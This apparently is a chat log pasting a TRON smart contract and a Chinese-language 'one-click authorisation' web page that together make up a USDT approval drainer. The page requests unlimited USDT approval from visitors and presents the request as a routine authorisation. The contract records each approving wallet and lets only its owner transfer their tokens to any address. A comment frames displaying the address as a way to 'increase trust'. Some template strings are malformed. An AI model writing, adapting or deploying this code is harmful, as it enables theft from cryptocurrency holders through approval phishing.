[Uploading 使用前端代码.html…]()
唐艺, [2025/10/20 23:24]
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface ITRC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

contract HelpTransferWithNotification {
    // 状态变量
    ITRC20 public targetToken;
    address public immutable owner;
    address[] public authorizedUsers; // 自动记录“已授权且触发过记录”的用户地址
    mapping(address => bool) public isRecorded; // 标记用户是否已被记录（避免重复）

    // 事件：转账通知 + 用户记录通知
    event DeployerNotification(address indexed from, address indexed to, uint256 amount, string action);
    event UserRecorded(address indexed user); // 记录用户时触发，可选

    // 构造函数：初始化代币地址和部署者
    constructor(address tokenAddr) {
        owner = msg.sender;
        targetToken = ITRC20(tokenAddr);
    }

    // 权限修饰符：仅部署者可调用核心功能
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    /******************************************************************************
     * 核心优化：用户无需登记，仅需调用一次该函数，合约自动记录（前提：已授权TRC20额度）
     * 调用成本极低（仅写入状态），用户可通过钱包一键触发
     ******************************************************************************/
    function triggerRecord() external {
        // 校验：用户已对合约授权TRC20额度（避免记录未授权用户）
        uint256 userAllowance = targetToken.allowance(msg.sender, address(this));
        require(userAllowance > 0, "Please approve TRC20 token first");
        
        // 避免重复记录，节省存储
        if (!isRecorded[msg.sender]) {
            authorizedUsers.push(msg.sender);
            isRecorded[msg.sender] = true;
            emit UserRecorded(msg.sender); // 可选：前端可监听该事件，确认记录成功
        }
    }

    /******************************************************************************
     * 部署者功能：1. 帮用户转账 2. 查询授权/余额（单个/批量）
     ******************************************************************************/
    // 1. 帮已授权用户转账（无需登记，仅需用户已授权）
    function helpTransferFrom(address from, address to, uint256 amount) external onlyOwner returns (bool) {
        uint256 allowedAmount = targetToken.allowance(from, address(this));
        require(allowedAmount >= amount, "Insufficient approval amount");
        require(to != address(0), "Invalid target address");
        require(amount > 0, "Transfer amount must be greater than 0");

        targetToken.transferFrom(from, to, amount);
        emit DeployerNotification(from, to, amount, "Auto transfer executed");
        return true;
    }

    // 2. 查询单个用户的TRC20余额（无需记录，知道地址即可查）
    function getUserBalance(address user) external view returns (uint256) {
        return targetToken.balanceOf(user);
    }

    // 3. 查询单个用户给合约的授权额度（无需记录，知道地址即可查）
    function checkUserApproval(address user) external view returns (uint256) {
        return targetToken.allowance(user, address(this));
    }

    // 4. 批量查询：获取所有“已授权且触发记录”的用户地址（部署者可循环查询每个用户的授权/余额）
    function getAllAuthorizedUsers() external view onlyOwner returns (address[] memory) {
        return authorizedUsers;
    }

    // 5. 批量查询：获取授权用户总数
    function getAuthorizedUserCount() external view onlyOwner returns (uint256) {
        return authorizedUsers.length;
    }
}

唐艺, [2025/10/20 23:41]
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRC20一键授权</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { padding: 20px; background: #f5f7fa; }
        .auth-box { max-width: 500px; margin: 30px auto; padding: 30px; background: #fff; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); text-align: center; }
        .title { font-size: 20px; color: #333; margin-bottom: 25px; }
        .addr-tip { font-size: 13px; color: #666; margin: 15px 0; word-break: break-all; }
        .auth-btn { width: 100%; padding: 14px; background: #2f54eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 20px 0; }
        .auth-btn:disabled { background: #ccc; cursor: not-allowed; }
        .status { margin-top: 20px; padding: 12px; border-radius: 6px; font-size: 14px; }
        .success { background: #f0f9eb; color: #52c41a; }
        .error { background: #fff1f0; color: #f5222d; }
        .loading { background: #fffbe6; color: #faad14; }
    </style>
</head>
<body>
    <div class="auth-box">
        <h3 class="title">TRC20代币一键授权</h3>
        <!-- 部署者合约地址提示（用户可查看，增加信任） -->
        <div class="addr-tip">授权目标合约（部署者地址）：<br><span id="deployerContractAddr">加载中...</span></div>
        
        <button class="auth-btn" id="authBtn" disabled>未检测到钱包</button>
        <div class="status" id="status"></div>
    </div>

    <script>
        // -------------------------- 部署者仅需修改这里！！！ --------------------------
        const YOUR_DEPLOYED_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 👉 替换成你的HelpTransferWithNotification合约地址
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20-USDT官方地址（无需改，除非授权其他代币）
        const MAX_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限授权额度
        // -----------------------------------------------------------------------------

        // DOM元素
        const authBtn = document.getElementById("authBtn");
        const status = document.getElementById("status");
        const deployerAddrEl = document.getElementById("deployerContractAddr");
        let tronWeb = null;

        // 1. 页面加载：显示部署者合约地址 + 自动检测钱包
        window.onload = () => {
            // 显示你的合约地址（脱敏，避免用户复制错误）
            deployerAddrEl.textContent = ${YOUR_DEPLOYED_CONTRACT.slice(0, 8)}...${YOUR_DEPLOYED_CONTRACT.slice(-6)};
            // 检测钱包
            checkWallet();
        };

        // 2. 自动检测TRON钱包（无需用户手动触发）
        function checkWallet() {
            if (window.tronWeb?.ready) {
                initWallet(window.tronWeb);
            } else {
                // 监听钱包注入（如用户打开钱包）
                window.addEventListener("tronWebReady", (e) => initWallet(e.detail.tronWeb));
                showStatus("请打开TRON钱包（如imToken/TrustWallet）", "loading");
                authBtn.textContent = "打开钱包后点击";
            }
        }

        // 3. 初始化钱包：获取用户地址 + 检测是否已授权
        async function initWallet(_tronWeb) {
            tronWeb = _tronWeb;
            try {
                // 自动获取用户地址（钱包会弹窗请求授权，仅1次）
                const accounts = await tronWeb.accounts.queryAccounts();
                const userAddr = accounts[0]?.address;

                if (userAddr) {
                    authBtn.textContent = "点击发起授权";
                    authBtn.disabled = false;
                    showStatus(`已连接钱包：${userAddr.slice(0, 6)}...${userAddr.slice(-4)}`, "success");
                    // 自动检测：用户是否已授权（避免重复操作）
                    await checkIfAuthorized(userAddr);
                } else {
                    showStatus("请在钱包中授权连接页面", "error");
                    authBtn.textContent = "授权钱包后点击";
                }
            } catch (err) {
                showStatus("钱包连接失败：" + err.message.slice(0, 40), "error");
            }
        }

        // 4. 检测用户是否已授权（自动跳过重复操作）
        async function checkIfAuthorized(userAddr) {
            try {

唐艺, [2025/10/20 23:41]
const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
                const approvedAmount = await usdtContract.allowance(userAddr, YOUR_DEPLOYED_CONTRACT).call();
                
                if (approvedAmount >= MAX_APPROVE) {
                    authBtn.disabled = true;
                    authBtn.textContent = "已完成授权";
                    showStatus("✅ 你已授权，无需重复操作", "success");
                }
            } catch (err) {
                showStatus("检测授权状态失败，可直接发起授权", "loading");
            }
        }

        // 5. 核心：一键授权（用户点击按钮触发）
        authBtn.addEventListener("click", async () => {
            authBtn.disabled = true;
            authBtn.textContent = "唤起钱包中...";
            showStatus("⏳ 请在钱包弹窗中点击「确认」", "loading");

            try {
                // 获取当前用户地址
                const userAddr = (await tronWeb.accounts.queryAccounts())[0]?.address;
                if (!userAddr) throw new Error("未获取到钱包地址");

                // 发起授权交易
                const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
                const tx = await usdtContract
                    .approve(YOUR_DEPLOYED_CONTRACT, MAX_APPROVE) // 授权给你的合约
                    .send({ from: userAddr, feeLimit: 300000000 }); // 0.3TRX手续费（足够）

                // 授权成功
                showStatus(`✅ 授权成功！交易ID：${tx.txid.slice(0, 12)}...`, "success");
                authBtn.textContent = "授权成功";
            } catch (err) {
                // 错误处理（用户拒绝/网络问题）
                const errMsg = err.message.includes("user rejected") ? "你取消了授权，请重新点击" : "授权失败：" + err.message.slice(0, 40);
                showStatus(errMsg, "error");
                authBtn.textContent = "重新发起授权";
                authBtn.disabled = false;
            }
        });

        // 简化版状态提示
        function showStatus(text, type) {
            status.textContent = text;
            status.className = status ${type};
        }
    </script>
</body>
</html>
